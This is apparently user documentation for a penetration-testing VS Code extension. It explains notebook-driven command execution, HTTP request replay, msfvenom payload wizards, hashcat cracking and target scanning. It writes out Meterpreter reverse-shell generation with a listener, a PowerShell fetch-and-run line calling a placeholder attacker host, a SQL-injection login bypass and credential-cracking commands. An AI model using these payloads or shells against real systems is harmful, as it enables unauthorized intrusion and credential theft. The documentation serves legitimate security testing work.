# Offensive Workflows

This guide walks through the attack-oriented features of Weaponized VSCode: running shell commands from your notes, replaying HTTP requests, generating payloads, cracking hashes, scanning targets, and decoding text. Each section shows the practical workflow you will use during a penetration test.

::: tip Prerequisites
Make sure you have [set up a workspace](./getting-started.md) and created at least one host note before continuing. Many features depend on the current host state to auto-populate variables like `$TARGET`, `$RHOST`, and `$IP`.
:::

## CodeLens Shell Runner

When you edit Markdown files inside the `hosts/`, `users/`, or `services/` directories, the extension scans every fenced code block for executable shell languages. Blocks tagged with `zsh`, `bash`, `sh`, or `powershell` get two clickable **CodeLens** buttons directly above the opening fence:

- **Run command in terminal** -- sends the entire block content to the active VS Code terminal. If no terminal is open, one is created automatically.
- **Copy commands** -- copies the block content to your clipboard.

### Writing Executable Blocks

Add shell commands to any note the same way you write normal Markdown code fences:

````markdown
```bash
nmap -sC -sV -oN nmap/initial $TARGET
```
````

When you click **Run command in terminal**, the extension pastes the commands into the currently focused terminal and executes them. Environment variables like `$TARGET`, `$RHOST`, `$IP`, `$LHOST`, and `$LPORT` are populated automatically from the workspace state, so you never need to hard-code IPs.

### Multi-Line Blocks

Blocks can contain multiple commands. Every line in the block is sent to the terminal:

````markdown
```bash
mkdir -p nmap
nmap -sC -sV -oN nmap/initial $TARGET
nmap -p- -oN nmap/all-ports $TARGET
```
````

Click once, and all three commands run in sequence in your terminal.

### PowerShell Blocks

The same CodeLens works for PowerShell. This is useful for Windows post-exploitation notes:

````markdown
```powershell
Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, SamAccountName
Import-Module .\PowerView.ps1
Get-DomainUser -Identity admin
```
````

### Practical Pattern: Write Once, Run Any Time

The key insight is that your notes become a **runbook**. During a pentest, write every command you run into the relevant host or service note. Next time you encounter a similar target, open the old note and click the CodeLens buttons -- no retyping, no command history hunting.

::: tip
Keep a `services/http/http.md` note with common web enumeration commands. When you encounter an HTTP service on a new engagement, the commands are ready to run with one click.
:::

## HTTP Repeater

Fenced code blocks with the `http` language tag get four CodeLens actions:

| CodeLens Button | Behavior |
|----------------|----------|
| **Send HTTP Request** | Sends the raw request over HTTP and shows the response |
| **Send HTTPS Request** | Sends the raw request over HTTPS with TLS verification disabled |
| **Copy in curl (HTTP)** | Converts to a `curl` command (HTTP) and copies to clipboard |
| **Copy in curl (HTTPS)** | Converts to a `curl` command (HTTPS) and copies to clipboard |

### Request Format

Write standard raw HTTP requests inside `http` fenced blocks:

````markdown
```http
GET /api/users HTTP/1.1
Host: target.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```
````

The `Host` header determines the target server. The extension constructs the full URL from the protocol prefix (`http://` or `https://`) plus the `Host` header value plus the request URI.

### POST Request Example

````markdown
```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json
Content-Length: 50

{"username": "admin", "password": "SuperSecret123"}
```
````

Blank line separates headers from the body, exactly like raw HTTP.

### Response Display

When you click **Send HTTP Request** or **Send HTTPS Request**, the extension fires the request using `node-fetch` internally and opens the full HTTP response in a **side-by-side virtual document**. The response includes the status line, all headers, and the body:

```
HTTP/1.1 200 OK
content-type: application/json
x-powered-by: Express

{"users": [{"id": 1, "name": "admin"}]}
```

The response document opens beside your notes so you can compare the request and response without switching tabs.

::: warning
**HTTPS mode disables TLS certificate verification** (`rejectUnauthorized: false`). This is intentional -- penetration test targets frequently use self-signed certificates. Do not use this against production systems where certificate validation matters.
:::

### Curl Conversion

The **Copy in curl** actions convert the raw HTTP block into an equivalent `curl` command, copy it to your clipboard, and also display it in a virtual document. This is handy when you need to run the request outside VS Code or share it with a teammate:

```bash
curl -X POST "http://target.htb/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "SuperSecret123"}'
```

### Practical Pattern: Burp-Style Repeater in Your Notes

Capture an interesting request from your proxy, paste it as an `http` block in your host note, and replay it any time with one click. Modify headers or parameters inline and re-send. This gives you a lightweight Burp Repeater workflow entirely within VS Code.

````markdown
## Authentication Bypass Attempts

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json

{"username": "admin' OR 1=1--", "password": "x"}
```

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json

{"username": "admin", "password": "", "role": "admin"}
```
````

Each block is independently executable -- click the one you want to test.

## Payload Generation (msfvenom)

Generate msfvenom payloads through an interactive wizard without memorizing flags.

**Command:** `Weapon: Create msfvenom payload`
**Command ID:** `weapon.task.msfvenom_creation`

### Interactive Wizard Steps

The wizard walks you through five steps with QuickPick menus:

**Step 1 -- Select payload type.** Choose from 11 built-in options:

| Payload |
|---------|
| `windows/x64/meterpreter/reverse_tcp` |
| `windows/meterpreter/reverse_tcp` |
| `linux/x64/meterpreter/reverse_tcp` |
| `linux/x86/meterpreter/reverse_tcp` |
| `php/meterpreter/reverse_tcp` |
| `python/meterpreter/reverse_tcp` |
| `windows/meterpreter/reverse_http` |
| `windows/x64/meterpreter/reverse_http` |
| `windows/meterpreter/reverse_https` |
| `windows/x64/meterpreter/reverse_https` |
| `java/meterpreter/reverse_tcp` |

**Step 2 -- Select output format.** Choose from 21 options:

`exe`, `elf`, `psh`, `dll`, `hta-psh`, `psh-cmd`, `psh-net`, `psh-reflection`, `elf-so`, `exe-service`, `raw`, `raw | xxd -i`, `jsp`, `jar`, `war`, `pl`, `asp`, `aspx`, `msi`, `python-reflection`, `vba`, `vba-exe`, `vba-psh`, `vbs`

::: info
The `psh` format generates a PowerShell payload with a loader. Use it with `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1')` to load in memory. The `raw | xxd -i` option outputs shellcode in C array format (redirect to `/dev/stdout` for best results).
:::

**Step 3 -- Select advanced options (multi-select).** Pick zero or more:

| Option | Effect |
|--------|--------|
| `PrependMigrate=true PrependMigrateProc=explorer.exe` | Auto-migrate to explorer.exe on execution |
| `PrependFork=true` | Fork before running payload |
| `PrependSetuid=true` | Call `setuid(0)` before payload |
| `PrependSetresuid=true` | Call `setresuid(0,0,0)` before payload |
| `PrependSetreuid=true` | Call `setreuid(0,0)` before payload |
| `PrependChrootBreak=true` | Attempt chroot escape |
| `AutoSystemInfo=false` | Disable automatic system info collection |

**Step 4 -- Enter output filename.** Default: `./trojan`. Supports VS Code variables like `${workspaceFolder}/payloads/shell`.

**Step 5 -- Start a listener?** Select **Yes** to auto-launch a `multi/handler` in a second terminal panel with the matching payload, LHOST, and LPORT.

### Generated Command

The wizard assembles and runs the final msfvenom command in a VS Code terminal:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  PrependMigrate=true PrependMigrateProc=explorer.exe \
  -o ./trojan -f exe
```

If you opted to start the listener, a second terminal opens running:

```bash
msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run -j'
```

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.msf.venom` | -- | Path to the `msfvenom` binary (required) |
| `weaponized.lhost` | -- | Your attacker IP, used as LHOST |
| `weaponized.lport` | `6789` | Your attacker port, used as LPORT |

Set these in `.vscode/settings.json`:

```json
{
  "weaponized.msf.venom": "/usr/bin/msfvenom",
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444
}
```

::: tip
On Kali Linux, `msfvenom` is typically at `/usr/bin/msfvenom`. If you use a custom Metasploit install, point the setting to your binary path.
:::

## Hash Cracking (hashcat)

Launch hashcat with an interactive wizard that handles mode selection, hash types, and device targeting.

**Command:** `Weapon: Crack hashes with hashcat`
**Command ID:** `weapon.task.hashcat_cracker`

### Interactive Wizard Steps

**Step 1 -- Select hash file.** A file picker opens so you can browse your workspace. Navigate to the file containing your hashes (e.g., `loot/hashes.txt`).

**Step 2 -- Select attack mode.**

| Mode | Hashcat Flag | Description |
|------|-------------|-------------|
| HASHCAT_MODE_WORDLIST | `-a 0` | Standard dictionary attack |
| HASHCAT_MODE_COMBINATION | `-a 1` | Combine two wordlists |
| HASHCAT_MODE_TOGGLE_CASE | `-a 2` | Toggle case on wordlist |
| HASHCAT_MODE_MASK_BRUTE_FORCE | `-a 3` | Brute-force with mask |
| HASHCAT_MODE_WORDLIST_MASK | `-a 6` | Hybrid: wordlist + mask |
| HASHCAT_MODE_MASK_WORDLIST | `-a 7` | Hybrid: mask + wordlist |

**Step 3 -- Select hash type.** A comprehensive list covering the most common pentest scenarios:

| Label | Hashcat `-m` | Examples |
|-------|-------------|----------|
| HASH_MD5 | 0 | Raw MD5 |
| HASH_SHA1 | 100 | Raw SHA1 |
| HASH_MD5CYPT | 500 | md5crypt (`$1$`) |
| HASH_MD4 | 900 | Raw MD4, NTLM input |
| HASH_NTLM | 1000 | Windows NTLM |
| HASH_SHA256 | 1400 | Raw SHA-256 |
| HASH_APRMD5 | 1600 | Apache APR1 (`$apr1$`) |
| HASH_SHA512 | 1800 | sha512crypt (`$6$`) |
| HASH_BCRYPT | 3200 | bcrypt (`$2a$`, `$2b$`) |
| HASH_NETNTLMv2 | 5600 | NetNTLMv2 (Responder captures) |
| HASH_SHA256CRYPT | 7400 | sha256crypt (`$5$`) |
| HASH_KRB5_PA_23 | 7500 | Kerberos Pre-Auth etype 23 |
| HASH_DJANGO_PBKDF2_SHA256 | 10000 | Django PBKDF2-SHA256 |
| HASH_PBKDF2_HMAC_SHA256 | 10900 | PBKDF2-HMAC-SHA256 |
| HASH_KRB5_TGS_23 | 13100 | Kerberoasting (etype 23) |
| HASH_JWT | 16500 | JWT (JSON Web Token) |
| HASH_KRB5_AS_REP_23 | 18200 | AS-REP Roasting (etype 23) |
| HASH_KRB5_PA_17 | 19800 | Kerberos Pre-Auth etype 17 |
| HASH_KRB5_PA_18 | 19900 | Kerberos Pre-Auth etype 18 |
| HASH_KRB5_AS_REP_17 | 19500 | AS-REP Roasting (etype 17) |
| HASH_KRB5_TGS_17 | 19600 | Kerberoasting (etype 17) |
| HASH_KRB5_TGS_18 / HASH_KRB5_AS_REP_18 | 19700 | Kerberos etype 18 (TGS/AS-REP) |

**Step 4 -- Select device type.**

| Device | Flag |
|--------|------|
| GPU | `-D 2` |
| CPU | `-D 1` |
| FPGA | `-D 3` |

**Step 5 -- Enter wordlist or mask.** Default value: `$ROCKYOU`. For brute-force mode, enter a mask like `?a?a?a?a?a?a?a?a`.

::: tip
Set the `ROCKYOU` environment variable in your `.vscode/settings.json` under `weaponized.envs` so that `$ROCKYOU` resolves to your wordlist path in every terminal:

```json
{
  "weaponized.envs": {
    "ROCKYOU": "/usr/share/wordlists/rockyou.txt"
  }
}
```
:::

### Generated Command

The wizard assembles and runs the command in a VS Code terminal (editor panel):

```bash
hashcat --force -a 0 -m 1000 -D 2 loot/hashes.txt /usr/share/wordlists/rockyou.txt
```

### Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `weaponized.hashcat` | `hashcat` | Path to the hashcat binary |

## Network Scanning

Launch configurable network scanners against your targets with automatic target selection.

**Command:** `Weapon: Run scanner over target`
**Command ID:** `weapon.task.scan`

### Interactive Flow

**Step 1 -- Select target.**

The extension reads your current host state. Depending on the situation:

- **One host active:** The host is selected automatically.
- **Multiple hosts active:** A QuickPick shows each host as `hostname (ip)` so you can choose.
- **No hosts found:** A free-text input box asks you to type a target manually.

After selecting a host, a second QuickPick shows the available identifiers for that host -- hostname, IP address, and any aliases. Pick whichever form the scanner needs.

**Step 2 -- Select scanner.**

A QuickPick lists every scanner defined in `weaponized.scanners`. Select the one you want.

**Step 3 -- Execute.**

The extension replaces every `$TARGET` in the scanner command with the identifier you picked and runs the command in a VS Code terminal panel.

### Default Scanners

These scanners ship out of the box. All are configurable in settings:

| Scanner | Command |
|---------|---------|
| rustscan | `rustscan -a $TARGET -- --script=vuln -A` |
| wfuzz subdomain | `wfuzz -c -w <dns_wordlist> -u http://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf subdomain | `ffuf -c -w <dns_wordlist> -u http://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |
| wfuzz https subdomains | `wfuzz -c -w <dns_wordlist> -u https://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf https subdomains | `ffuf -c -w <dns_wordlist> -u https://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |
| nuclei | `nuclei -target $TARGET` |
| dirsearch | `dirsearch -u http://$TARGET` |
| dirsearch https | `dirsearch -u https://$TARGET` |
| feroxbuster | `feroxbuster -u http://$TARGET -w <dir_wordlist> -x php,html,txt -t 50` |
| feroxbuster https | `feroxbuster -u https://$TARGET -w <dir_wordlist> -x php,html,txt -t 50` |

::: info
The `<dns_wordlist>` and `<dir_wordlist>` placeholders above refer to the `weaponized.user_vars.dns_top100000` and `weaponized.user_vars.dir_raft_medium` settings. Configure these to point at your wordlist files.
:::

## Adding Custom Scanners

Override or extend the scanner list in `.vscode/settings.json`:

```json
{
  "weaponized.scanners": {
    "my-custom-scan": "custom-tool --target $TARGET --output results.txt",
    "nikto": "nikto -h http://$TARGET",
    "nmap-full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET",
    "masscan": "masscan -p1-65535 $TARGET --rate=1000"
  }
}
```

Rules:

- Each key is the scanner name shown in the QuickPick.
- Each value is the command template. `$TARGET` is replaced at runtime with the selected host identifier.
- You can reference VS Code configuration variables: `${config:weaponized.user_vars.my_wordlist}` works inside scanner commands.
- Scanners run in a VS Code terminal (editor panel), so you see the output in real time and can interact with the process.

### Practical Pattern: Per-Engagement Scanners

Customize the scanner list per workspace. In your engagement's `.vscode/settings.json`, add scanners specific to the target environment:

```json
{
  "weaponized.scanners": {
    "smb-enum": "crackmapexec smb $TARGET --shares -u '' -p ''",
    "ldap-search": "ldapsearch -x -H ldap://$TARGET -b 'DC=corp,DC=local'",
    "snmp-walk": "snmpwalk -v2c -c public $TARGET"
  }
}
```

Next time you run `Weapon: Run scanner over target`, your custom entries appear alongside the defaults.

## Text Decoding

Decode selected text using CyberChef's auto-detection directly inside VS Code.

**Command:** `Weapon: Decode selected text`
**Command ID:** `weapon.magic_decoder`

### How It Works

1. **Select text** in any editor -- highlight a base64 string, hex-encoded blob, URL-encoded payload, or anything else you want to decode.
2. **Run the command** from the Command Palette (`Ctrl+Shift+P` > `Weapon: Decode selected text`).
3. **CyberChef opens** inside VS Code's Simple Browser panel with the **Magic** recipe pre-applied.

The Magic recipe uses auto-detection depth of 5, meaning CyberChef tries multiple decoding strategies and picks the most likely result. It automatically handles:

- Base64 (standard and URL-safe)
- Hexadecimal
- URL encoding / percent encoding
- Rotation ciphers (ROT13, etc.)
- Nested encodings (e.g., base64-encoded hex)

### Example Workflow

You find a suspicious cookie value in an HTTP response:

```
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QifQ==
```

Select the text, run the decode command, and CyberChef instantly shows:

```json
{"user":"admin","role":"guest"}
```

::: tip
This also works for JWT tokens. Select the entire JWT string, and CyberChef will decode the header and payload sections, revealing claims and algorithm details.
:::

### No External Browser Needed

CyberChef loads from `https://gchq.github.io/CyberChef` inside VS Code's built-in Simple Browser. Your selected text is base64-encoded and passed as a URL parameter, so it never leaves your machine until the page loads. Everything happens within the editor window.

## Putting It All Together

Here is a typical attack sequence using these workflows in a single engagement:

1. **Set up the workspace** and create a host note for `target.htb`.
2. **Run a scanner** -- `Weapon: Run scanner over target` with rustscan to find open ports.
3. **Add commands to the host note** -- write `nmap`, `gobuster`, and other commands as `bash` blocks.
4. **Execute from notes** -- click CodeLens to run each command. Output appears in the terminal while the commands stay documented in your note.
5. **Capture HTTP requests** -- paste interesting requests from your proxy as `http` blocks and replay them with modifications.
6. **Generate a payload** -- `Weapon: Create msfvenom payload` to build a reverse shell and auto-start the handler.
7. **Crack captured hashes** -- `Weapon: Crack hashes with hashcat` to crack NTLM hashes from secretsdump.
8. **Decode tokens** -- select a JWT or base64 blob, decode it with CyberChef to find hardcoded secrets.

Every command, request, and finding lives in your Markdown notes -- fully reproducible, auditable, and ready for report writing.

## Migration from v0.4.x

::: info Migrating from v0.4.x?
If you used the older version of the extension, here is how the workflows have changed:

| Old (v0.4.x) | New (v0.5+) |
|--------------|-------------|
| `Tasks: Run Task` > select from list | Direct Command Palette commands: `Weapon: Create msfvenom payload`, `Weapon: Crack hashes with hashcat`, `Weapon: Run scanner over target` |
| "run command with selection" task | CodeLens **Run command in terminal** on any `bash`/`sh`/`zsh`/`powershell` block |
| Tasks defined in `.vscode/tasks.json` | Built into the extension -- no JSON config needed |
| rustscan task with manual target input | `Weapon: Run scanner over target` auto-uses the current host from your notes |
| Manual `msfvenom` commands in terminal | Interactive wizard with auto-populated LHOST/LPORT and optional auto-listener |
| Manual `hashcat` commands with memorized flags | Interactive wizard with hash type/mode menus and file picker |

The core principle is the same: **notes drive your workflow**. The difference is that tool integration is now built into the extension with guided wizards instead of VS Code tasks.
:::
